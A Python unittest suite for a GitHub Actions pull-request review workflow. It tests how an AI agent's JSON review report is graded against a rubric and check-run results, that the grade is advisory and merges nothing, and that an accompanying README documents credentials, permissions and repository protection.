class GradeTheReview(unittest.TestCase):
    steps = ReusableReviewWorkflow.steps
    step = single.ReviewPrWorkflow.step
    run_in = ReusableReviewWorkflow.run_in

    def setUp(self):
        self.text = WORKFLOW.read_text()
        self.code = single.code(self.text)
        self.helper = (ROOT / "scripts" / "review_grade.py").read_text()

    def grade(self, report, runs=(("completed", "success", OTHER),), rubric=RUBRIC, wait="0", later=None,
              fail=False, base=None, head=None, loop=None, own=None, reports=None, names=None):
        """Run the grade step in a workspace whose harness/ is a copy of this factory's grading files, with
        `report` as report.json unless it's None, each of `reports` as reports/<name>.md, and `names` as
        AGENT_NAMES. Returns the step's result, grade.txt or None, the step summary, and gh's argument lines."""
        with tempfile.TemporaryDirectory() as tmp:
            ws = Path(tmp)
            scripts = ws / "harness" / "scripts"
            scripts.mkdir(parents=True)
            for name in ("loop.py", "names.py", "review_grade.py", "review_report.py"):
                (scripts / name).write_text((ROOT / "scripts" / name).read_text())
            (ws / "harness" / "skills" / "review-pr").mkdir(parents=True)
            (ws / "harness" / "skills" / "review-pr" / "report.schema.json").write_text(SCHEMA_TEXT)
            if loop is not None:
                (scripts / "loop.py").write_text(loop)
            if rubric is not None:
                (ws / "harness" / "review-rubric.json").write_text(rubric)
            for folder, text in (("base", base), ("head", head)):
                if text is not None:
                    (ws / folder).mkdir()
                    (ws / folder / "review-rubric.json").write_text(text)
            fake, temp, bin_dir = ws / "fake", ws / "temp", ws / "bin"
            for folder in (fake, temp, bin_dir):
                folder.mkdir()
            (fake / "runs").write_text(tsv(runs))
            for n, more in enumerate(later or [], 2):
                (fake / "runs.{}".format(n)).write_text(tsv(more))
            (bin_dir / "gh").write_text(FAKE_GH)
            (bin_dir / "gh").chmod(0o755)
            if report is not None:
                (temp / "report.json").write_text(report)
            if reports is not None:
                (temp / "reports").mkdir()
                for name, text in reports.items():
                    (temp / "reports" / (name + ".md")).write_text(text)
            summary = ws / "summary.md"
            env = dict(PATH="{}:{}".format(bin_dir, os.environ["PATH"]), RUNNER_TEMP=str(temp),
                       GITHUB_STEP_SUMMARY=str(summary), GITHUB_RUN_ID=RUN_ID, REPO="o/r", HEAD_SHA="abc123",
                       GH_TOKEN="", GRADE_WAIT_MINUTES=wait, GRADE_POLL_SECONDS="0.05", FAKE=str(fake))
            if fail:
                env["FAKE_GH_FAIL"] = REFUSED if fail is True else fail
            if own is not None:
                env["OWN_CHECK_RUN_ID"] = own
            if names is not None:
                env["AGENT_NAMES"] = names
            result = self.run_in(GRADE, ws, **env)
            grade = temp / "grade.txt"
            args = fake / "args"
            return (result, grade.read_text() if grade.exists() else None,
                    summary.read_text() if summary.exists() else "",
                    args.read_text().splitlines() if args.exists() else [])

    def assertGrade(self, report, line, **kwargs):
        result, grade, summary, _ = self.grade(report, **kwargs)
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
        self.assertEqual(grade, line + "\n", result.stdout + result.stderr)
        self.assertIn(line, summary)
        return result, summary

    def test_a_ready_report_with_passing_checks_grades_ten(self):
        self.assertGrade(READY, "Verdict: ready. Grade 10/10: ready, checks passing.")

    def test_nits_grade_eight(self):
        nit = {"file": "a.py", "line": 3, "severity": "nit", "rule": "naming", "summary": "A vague name."}
        self.assertGrade(report("ready with nits", [nit]),
                         "Verdict: ready with nits. Grade 8/10: ready with nits, checks passing.")

    def test_changes_needed_grades_three(self):
        self.assertGrade(report("changes needed"),
                         "Verdict: changes needed. Grade 3/10: changes needed, checks passing.")

    def test_a_verdict_it_can_t_read_takes_the_unreadable_key(self):
        self.assertGrade(report("looks good"), "Verdict: unreadable. Grade 2/10: the verdict is unreadable.")

    def test_a_report_that_fails_the_schema_grades_as_unreadable(self):
        # The grade reads the same check the comment does: a Markdown report, a finding the schema doesn't
        # allow, or no report at all, takes the unreadable key, never the verdict the text claims.
        for bad in ("Fine.\n\nVERDICT: ready\n", "```\n" + READY + "\n```",
                    report("ready", [{"file": "a.py", "severity": "major", "rule": "r", "summary": "s"}]),
                    json.dumps({"verdict": "ready", "findings": [], "grade": 10})):
            self.assertGrade(bad, "Verdict: unreadable. Grade 2/10: the verdict is unreadable.")

    def test_one_json_fence_around_the_report_still_grades(self):
        self.assertGrade("```json\n" + READY + "\n```\n", "Verdict: ready. Grade 10/10: ready, checks passing.")

    def test_a_failed_check_takes_the_failing_key(self):
        self.assertGrade(READY,"Verdict: ready. Grade 1/10: ready, a check failed.",
                         runs=[("completed", "success", OTHER), ("completed", "failure", OTHER)])

    def test_neutral_and_skipped_checks_pass(self):
        self.assertGrade(READY,"Verdict: ready. Grade 10/10: ready, checks passing.",
                         runs=[("completed", "neutral", OTHER), ("completed", "skipped", OTHER)])

    def test_no_check_left_once_its_own_run_goes_says_none_ran(self):
        self.assertGrade(READY,"Verdict: ready. Grade 10/10: ready, no checks ran.",
                         runs=[("in_progress", "", OWN)])

    def test_its_own_run_s_failure_is_ignored_and_another_run_s_counts(self):
        self.assertGrade(READY,"Verdict: ready. Grade 10/10: ready, checks passing.",
                         runs=[("completed", "failure", OWN), ("completed", "success", OTHER)])
        self.assertGrade(READY,"Verdict: ready. Grade 1/10: ready, a check failed.",
                         runs=[("completed", "success", OWN), ("completed", "failure", OTHER)])

    def test_a_check_still_running_when_the_wait_ends_leaves_it_pending(self):
        _, summary = self.assertGrade(READY,"Verdict: ready. Grade pending: checks still running.",
                                      runs=[("in_progress", "", OTHER)])
        self.assertIn(NOT_LATER, summary)

    def test_it_waits_for_a_check_that_finishes(self):
        result, grade, summary, args = self.grade(READY, runs=[("queued", "", OTHER)], wait="0.05",
                                                  later=[[("completed", "success", OTHER)]])
        self.assertEqual(grade, "Verdict: ready. Grade 10/10: ready, checks passing.\n", result.stdout)
        self.assertEqual(len(args), 2)
        self.assertNotIn(NOT_LATER, summary)

    def test_it_reads_the_head_commit_s_check_runs(self):
        _, _, _, args = self.grade(READY)
        self.assertEqual(len(args), 1)
        self.assertTrue(args[0].startswith("api --paginate repos/o/r/commits/abc123/check-runs --jq "), args[0])

    def test_a_failed_read_counts_as_pending_and_says_why(self):
        result, summary = self.assertGrade(READY,"Verdict: ready. Grade pending: checks still running.",
                                           fail="HTTP 502: Bad Gateway")
        self.assertIn("gh api exited 1: HTTP 502: Bad Gateway", summary)
        self.assertIn(NOT_LATER, summary)

    def test_a_refused_read_stops_waiting_and_names_the_permission(self):
        # A token without checks: read gets a 403 on every read, so waiting the whole time grades nothing more
        # and posts the review late (review of #463).
        result, grade, summary, args = self.grade(READY, fail=True, wait="0.05")
        self.assertEqual(grade, "Verdict: ready. Grade pending: checks still running.\n", result.stdout)
        self.assertEqual(len(args), 1, "a refusal is read once, not polled")
        self.assertIn(REFUSED, summary)
        self.assertIn("checks: read", summary)

    def test_another_failure_is_read_again(self):
        _, _, _, args = self.grade(READY, fail="HTTP 502: Bad Gateway", wait="0.05")
        self.assertGreater(len(args), 1)

    def test_a_sibling_job_in_its_own_run_counts(self):
        # Only the grade's own job is left out: a test job beside it in the caller's run still grades.
        sibling = "https://github.com/o/r/actions/runs/{}/job/2".format(RUN_ID)
        self.assertGrade(READY,"Verdict: ready. Grade 1/10: ready, a check failed.",
                         runs=[("in_progress", "", OWN, "11"), ("completed", "failure", sibling, "12")], own="11")
        self.assertGrade(READY,"Verdict: ready. Grade 10/10: ready, no checks ran.",
                         runs=[("in_progress", "", OWN, "11")], own="11")

    def test_without_its_own_check_run_id_it_leaves_out_its_whole_run(self):
        sibling = "https://github.com/o/r/actions/runs/{}/job/2".format(RUN_ID)
        self.assertGrade(READY,"Verdict: ready. Grade 10/10: ready, no checks ran.",
                         runs=[("in_progress", "", OWN, "11"), ("completed", "failure", sibling, "12")], own="")

    def test_the_wait_is_capped_so_the_review_still_posts(self):
        spec = importlib.util.spec_from_file_location("review_grade", ROOT / "scripts" / "review_grade.py")
        grade = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(grade)
        self.assertEqual(grade.wait_minutes({"GRADE_WAIT_MINUTES": "60"}), 15)
        self.assertEqual(grade.wait_minutes({"GRADE_WAIT_MINUTES": "4"}), 4)
        self.assertEqual(grade.wait_minutes({}), 10)
        self.assertIn("OWN_CHECK_RUN_ID: ${{ job.check_run_id }}", self.text)

    def test_a_missing_or_invalid_rubric_grades_zero_and_names_the_file(self):
        self.assertGrade(READY,"Verdict: ready. Grade 0/10: review-rubric.json is missing.",
                         rubric=None)
        self.assertGrade(READY,"Verdict: ready. Grade 0/10: review-rubric.json isn't valid JSON.",
                         rubric="{not json")

    def test_a_rubric_in_base_or_head_changes_nothing(self):
        mine = '{"ready": 0, "ready with nits": 0, "changes needed": 0, "failing": 0, "unreadable": 0}'
        self.assertGrade(READY,"Verdict: ready. Grade 10/10: ready, checks passing.",
                         base=mine, head=mine)
        self.assertGrade(READY,"Verdict: ready. Grade 0/10: review-rubric.json is missing.",
                         rubric=None, base=RUBRIC, head=RUBRIC)

    def test_a_broken_grader_still_exits_zero_and_writes_no_grade(self):
        result, grade, _, _ = self.grade(READY, loop="this is not python(\n")
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIsNone(grade)
        self.assertIn("::warning::", result.stdout)

    def regrade(self, grade):
        """Run the step that puts the grade on each comment the fetch kept, two agents' here. Returns gh's
        argument lines and the bodies it sent."""
        with tempfile.TemporaryDirectory() as tmp:
            path = single.fake_gh(tmp)
            (Path(tmp) / "comments").mkdir()
            for name, number in (("review-pr", "11"), ("cto", "12")):
                (Path(tmp) / "comments" / (name + ".md")).write_text(
                    "<!-- {} -->\n\nReady.\n\nVERDICT: ready\n\n---\n".format(name))
                (Path(tmp) / "comments" / (name + ".id")).write_text(number + "\n")
            if grade is not None:
                (Path(tmp) / "grade.txt").write_text(grade)
            result = self.run_in(REGRADE, tmp, RUNNER_TEMP=tmp, PATH=path, FAKE=tmp, REPO="o/r", GH_TOKEN="")
            self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
            args, bodies = Path(tmp) / "args", Path(tmp) / "bodies"
            return (args.read_text().splitlines() if args.exists() else [],
                    bodies.read_text().split("\n=====\n")[:-1] if bodies.exists() else [])

    def test_each_comment_s_last_line_carries_the_grade(self):
        args, bodies = self.regrade("Verdict: ready. Grade 10/10: ready, checks passing.\n")
        self.assertEqual([line.split()[3] for line in args],
                         ["repos/o/r/issues/comments/12", "repos/o/r/issues/comments/11"])
        self.assertTrue(all(line.startswith("api --method PATCH ") for line in args), args)
        last = ("Posted by the review-pr workflow. Verdict: ready. Grade 10/10: ready, checks passing. "
                "A person decides what happens to this pull request.")
        self.assertEqual(bodies, ["<!-- {} -->\n\nReady.\n\nVERDICT: ready\n\n---\n{}\n".format(name, last)
                                  for name in ("cto", "review-pr")])

    def test_no_grade_leaves_the_comments_as_posted(self):
        self.assertEqual(self.regrade(None), ([], []))
        self.assertIn('echo "Posted by the review-pr workflow. A person decides what happens to this pull '
                      'request."', self.step(POST))

    def test_the_prompt_asks_for_one_json_object_shaped_like_the_schema(self):
        prompt = " ".join(self.step(PROMPT).split())
        self.assertIn("Output only one JSON object, with no code fence and nothing before or after it, shaped as "
                      "harness/skills/review-pr/report.schema.json describes", prompt)
        for word in ('"verdict"', '"ready"', '"ready with nits"', '"changes needed"', '"findings"', '"file"',
                     '"line"', '"severity"', '"blocks"', '"nit"', '"rule"', '"summary"'):
            self.assertIn(word, prompt)
        self.assertNotIn("Its last line is its verdict", prompt)
        self.assertNotIn("as Markdown", prompt)
        self.assertIn('> "$RUNNER_TEMP/report.json"', self.step(CLAUDE))
        self.assertIn('head -c 2000 "$RUNNER_TEMP/report.json"', self.step(CLAUDE))
        self.assertIn('cat "$RUNNER_TEMP/report.md"', self.step(POST))
        self.assertIn("python3 harness/scripts/review_report.py", self.step(SCHEMA))

    def test_the_grade_comes_from_loop_py_alone(self):
        key_and_number = re.compile(r"""["']?(ready with nits|ready|changes needed|failing|unreadable)["']?\s*[:=]\s*\d""")
        for name, text in (("the workflow", self.text), ("the helper", self.helper)):
            self.assertIsNone(key_and_number.search(text), name)
        self.assertIn("import loop", self.helper)
        for name in ("load_rubric", "review_grade_for", "grade_text", "PASSING_CHECKS"):
            self.assertIn("loop." + name, self.helper)
            self.assertNotIn("def " + name, self.helper)
        self.assertIn('loop.ROOT / loop.DEFAULTS["review_rubric"]', self.helper)
        # The verdict comes from the schema check the comment uses, never from a model's last line: report.json
        # through review_report.load(), or, in the grade job, the line review_report.render() wrote, which
        # review_report.rendered_verdict() reads back.
        self.assertIn("import review_report", self.helper)
        self.assertIn("review_report.load(", self.helper)
        self.assertIn("review_report.rendered_verdict(", self.helper)
        self.assertNotIn("loop.report_verdict", self.helper)
        self.assertNotIn("def load", self.helper)

    def test_the_grade_step_holds_no_secret_and_waits_as_told(self):
        grade = self.step(GRADE)
        env = grade.split("env:\n", 1)[1].split("run: |", 1)[0]
        self.assertEqual(sorted(line.strip() for line in env.splitlines() if line.strip()), sorted([
            "GH_TOKEN: ${{ github.token }}", "REPO: ${{ github.repository }}",
            "HEAD_SHA: ${{ github.event.pull_request.head.sha }}",
            "GRADE_WAIT_MINUTES: ${{ inputs.grade-wait-minutes }}",
            "OWN_CHECK_RUN_ID: ${{ job.check_run_id }}",
            "AGENT_NAMES: ${{ needs.agents.outputs.names }}"]))
        self.assertIn("python3 harness/scripts/review_grade.py", grade)
        on = self.code.split("\non:\n", 1)[1].split("\npermissions:", 1)[0]
        self.assertRegex(on, r"grade-wait-minutes:\n(?:\s+description: .*\n)\s+required: false\n"
                             r"\s+default: 10\n\s+type: number")
        self.assertIn("timeout-minutes: 30", self.code)

    def test_the_grade_sets_no_status_and_approves_or_merges_nothing(self):
        self.assertEqual(sorted(single.block(self.code, "permissions")), WORKFLOW_PERMISSIONS)
        self.assertNotIn("statuses", self.code)
        for name in (GRADE, POST, FETCH, REGRADE):
            for word in ("statuses", "approve", "merge"):
                self.assertNotIn(word, self.step(name).lower(), name)
        for word in ("statuses", "/reviews", "/merge", "--method", "-X", "POST", "PATCH", "PUT"):
            self.assertNotIn(word, self.helper)


class CallerReadme(unittest.TestCase):
    def setUp(self):
        self.assertTrue(README.is_file(), "examples/ci/README.md doesn't exist")
        self.text = README.read_text()

    def test_the_headings_come_in_order(self):
        headings = re.findall(r"^## (.+)$", self.text, re.M)
        self.assertEqual(headings, ["The credential", "The caller", "The secret", "A private factory repo",
                                    "Protecting the factory repo", "Testing the review", "Team standards",
                                    "The grade"])

    def test_the_protecting_section_says_how(self):
        self.assertIn("\n## Protecting the factory repo\n", self.text)
        section = self.text.split("\n## Protecting the factory repo\n", 1)[1].split("\n## ", 1)[0]
        section = " ".join(section.split())
        for word in ("ruleset", "approval", "force push", "admins", "review-pr.yml@<sha>", "rotate"):
            self.assertIn(word, section)
        caller = self.text.split("\n## The caller\n", 1)[1].split("\n## ", 1)[0]
        self.assertIn("(#protecting-the-factory-repo)", caller)

    def test_the_caller_calls_the_workflow_and_passes_both_secrets(self):
        blocks = fenced(self.text, "yaml")
        self.assertEqual(len(blocks), 2, "two ```yaml blocks, the key caller and the Bedrock caller")
        caller = blocks[0]
        self.assertIn("uses: your-org/factory/.github/workflows/review-pr.yml@main", caller)
        self.assertIn("factory-repo: your-org/factory", caller)
        for name in ("ANTHROPIC_API_KEY", "FACTORY_DEPLOY_KEY"):
            self.assertIn("{0}: ${{{{ secrets.{0} }}}}".format(name), caller)
        self.assertIn("types: [opened, synchronize, reopened, ready_for_review]", caller)
        self.assertNotIn("secrets: inherit", caller)
        self.assertNotIn("skills/", caller)
        self.assertNotIn("pull_request_target", caller)

    def test_the_caller_asks_for_the_same_permissions(self):
        caller = fenced(self.text, "yaml")[0]
        self.assertEqual(sorted(single.block(caller, "permissions")), PERMISSIONS)
        self.assertIn("group: review-pr-${{ github.event.pull_request.number }}", caller)

    def test_the_bedrock_caller_passes_the_role_and_only_the_deploy_key(self):
        key, bedrock = fenced(self.text, "yaml")
        self.assertIn("id-token: write", bedrock)
        self.assertEqual(sorted(single.block(bedrock, "permissions")), PERMISSIONS)
        self.assertNotIn("ANTHROPIC_API_KEY", bedrock)
        self.assertNotIn("CLAUDE_CODE_OAUTH_TOKEN", bedrock)
        for line in ("aws-role-arn: arn:aws:iam::123456789012:role/factory-review", "aws-region: us-east-1",
                     "factory-repo: your-org/factory", "FACTORY_DEPLOY_KEY: ${{ secrets.FACTORY_DEPLOY_KEY }}"):
            self.assertIn(line, bedrock)
        self.assertEqual(re.findall(r"secrets\.(\w+)", bedrock), ["FACTORY_DEPLOY_KEY"])
        on = lambda text: text.split("\non:\n", 1)[1].split("\npermissions:", 1)[0]  # noqa: E731
        self.assertEqual(on(bedrock), on(key))
        concurrency = lambda text: text.split("\nconcurrency:\n", 1)[1].split("\njobs:", 1)[0]  # noqa: E731
        self.assertEqual(concurrency(bedrock), concurrency(key))

    def test_the_bedrock_section_says_how_to_set_it_up(self):
        self.assertIn("\n### On Amazon Bedrock\n", self.text)
        caller = self.text.split("\n## The caller\n", 1)[1].split("\n## ", 1)[0]
        self.assertIn("\n### On Amazon Bedrock\n", caller, "the Bedrock section sits under The caller")
        section = " ".join(caller.split("\n### On Amazon Bedrock\n", 1)[1].split())
        for words in ("bedrock-review-role.yml", "aws cloudformation deploy",
                      "gh api --method PUT repos/your-org/product/actions/oidc/customization/sub",
                      '"include_claim_keys": ["repo", "context", "job_workflow_ref"]',
                      "Approved tools", "steering/data-and-tools.md", "first"):
            self.assertIn(words, section)

    def test_the_key_is_read_only(self):
        credential = self.text.split("## The credential", 1)[1].split("## The caller", 1)[0]
        self.assertIn("Allow write access", credential)
        self.assertIsNone(single.KEY_SHAPES.search(self.text), "something in the README looks like a key")

    def test_the_grade_section_says_where_it_comes_from_and_that_it_only_advises(self):
        section = " ".join(self.text.split("\n## The grade\n", 1)[1].split("\n## ", 1)[0].split())
        for words in ("review-rubric.json", "scripts/loop.py", "default branch", "grade-wait-minutes",
                      "advisory", "sets no status", "merges nothing"):
            self.assertIn(words, section)
        docs = " ".join((ROOT / "docs" / "factory-in-ci.md").read_text().split())
        for words in ("### The grade", "review-rubric.json", "grade-wait-minutes", "merges nothing"):
            self.assertIn(words, docs)

    def test_it_lists_the_other_examples(self):
        for name in ("loop.yml", "project-checks.yml", "review-pr.yml"):
            self.assertIn("examples/ci/" + name, self.text)

    def test_the_skill_points_at_the_readme(self):
        skill = (ROOT / "skills" / "review-pr" / "SKILL.md").read_text()
        self.assertIn("examples/ci/README.md", skill)


if __name__ == "__main__":
    unittest.main()
